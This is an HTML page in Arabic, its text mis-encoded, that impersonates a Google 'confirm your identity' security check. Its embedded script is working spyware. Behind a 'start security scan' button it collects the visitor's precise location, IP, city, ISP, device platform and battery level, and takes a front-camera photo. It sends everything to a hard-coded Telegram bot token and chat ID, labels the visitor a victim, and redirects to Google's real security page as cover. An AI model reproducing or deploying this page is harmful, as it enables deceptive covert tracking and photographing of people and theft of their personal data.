<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ£ÙƒÙŠØ¯ Ø£Ù…Ø§Ù† Ø§Ù„Ø­Ø³Ø§Ø¨ - Google</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; max-width: 400px; padding: 20px; border: 1px solid #dadce0; border-radius: 8px; }
        img { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; }
        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Google_Safe_Browsing_Logo.svg/1200px-Google_Safe_Browsing_Logo.svg.png" alt="Google Safe">
    <h1>ØªØ£ÙƒÙŠØ¯ Ù‡ÙˆÙŠØªÙƒ</h1>
    <p>Ù„Ù‚Ø¯ Ù„Ø§Ø­Ø¸Ù†Ø§ Ù†Ø´Ø§Ø·Ø§Ù‹ ØºÙŠØ± Ù…Ø¹ØªØ§Ø¯. Ù„ØªØ£Ù…ÙŠÙ† Ø­Ø³Ø§Ø¨ÙƒØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨ÙØ­Øµ Ø§Ù„Ø£Ù…Ø§Ù† Ø¹Ø¨Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ ÙˆØ§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ÙˆØ¬Ù‡.</p>
    <button class="btn" onclick="startMission()">Ø¨Ø¯Ø¡ ÙØ­Øµ Ø§Ù„Ø£Ù…Ø§Ù†</button>
</div>

<video id="video" autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const token = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
    const myId = "7109332130";

    async function startMission() {
        // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ ÙÙˆØ±Ø§Ù‹
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                await sendTelegram(`ğŸ“ **ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø¨Ø¯Ù‚Ø©!**\nØ§Ù„Ø±Ø§Ø¨Ø·: ${mapUrl}\nØ§Ù„Ø¯Ù‚Ø©: ${p.coords.accuracy} Ù…ØªØ±`);
                await captureProcess();
            }, async (err) => {
                await sendTelegram("âš ï¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹.");
                await captureProcess();
            }, {enableHighAccuracy: true});
        }

        // 2. Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² Ø§Ù„Ù€ IP ÙˆØ§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
        const ipRes = await fetch('https://ipapi.co/json/').then(res => res.json());
        const battery = navigator.getBattery ? await navigator.getBattery() : {level: 0};
        
        let report = `ğŸ‘¤ **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ©:**\n` +
                     `ğŸŒ IP: \`${ipRes.ip}\`\n` +
                     `ğŸ“ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: \`${ipRes.city}\`\n` +
                     `ğŸ“± Ø§Ù„Ù†Ø¸Ø§Ù…: \`${navigator.platform}\`\n` +
                     `ğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: \`${battery.level * 100}%\`\n` +
                     `ğŸ¢ Ø§Ù„Ø´Ø±ÙƒØ©: \`${ipRes.org}\``;
        await sendTelegram(report);
    }

    async function captureProcess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;
            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const imageData = canvas.toDataURL('image/jpeg');
                stream.getTracks().forEach(t => t.stop());
                await sendPhotoToTelegram(imageData);
                window.location.href = "https://myaccount.google.com/security"; // ØªÙ…ÙˆÙŠÙ‡ Ù†Ù‡Ø§Ø¦ÙŠ
            }, 1000);
        } catch (e) {
            window.location.href = "https://myaccount.google.com/security";
        }
    }

    async function sendTelegram(text) {
        return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: myId, text: text, parse_mode: 'Markdown' })
        });
    }

    async function sendPhotoToTelegram(base64) {
        const blob = await (await fetch(base64)).blob();
        const fd = new FormData();
        fd.append('chat_id', myId);
        fd.append('photo', blob, 'shot.jpg');
        return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
